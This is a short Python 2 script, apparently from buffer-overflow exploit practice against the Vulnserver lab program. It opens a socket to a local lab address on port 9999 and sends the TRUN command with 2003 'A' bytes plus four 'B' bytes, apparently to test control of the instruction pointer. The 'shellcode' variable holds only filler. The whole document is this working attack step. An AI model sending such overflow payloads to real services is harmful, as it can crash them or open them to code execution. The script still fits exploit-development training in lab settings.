#! /usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.141',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "CRASH!"
	sys.exit()
